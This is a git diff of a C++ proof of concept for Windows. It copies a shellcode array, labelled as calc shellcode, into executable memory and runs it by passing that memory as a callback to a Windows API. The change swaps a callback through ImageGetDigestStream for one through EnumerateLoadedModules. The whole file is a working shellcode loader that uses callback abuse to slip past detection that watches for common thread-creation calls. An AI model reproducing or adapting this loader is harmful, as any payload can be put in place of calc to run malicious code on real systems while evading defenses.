@@ -1,8 +1,8 @@
 #include <windows.h>
 #include <stdio.h>
-#include <imagehlp.h>
+#include <dbghelp.h>
 
-// Requires Imagehlp.lib
+// Requires dbghelp.lib
 
 // alfarom256 calc shellcode
 unsigned char op[] =
@@ -33,17 +33,6 @@ int main() {
 
     LPVOID addr = ::VirtualAlloc(NULL, sizeof(op), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     ::RtlMoveMemory(addr, op, sizeof(op));
-
-    HANDLE hImg = ::CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    HANDLE dummy;
-
-    if (hImg) {
-
-        ::ImageGetDigestStream(hImg, CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO, (DIGEST_FUNCTION)addr, &dummy);
-        ::CloseHandle(dummy);
-
-    }
-
-    ::CloseHandle(hImg);
+    ::EnumerateLoadedModules(::GetCurrentProcess(), (PENUMLOADED_MODULES_CALLBACK)addr, NULL);
 
 }
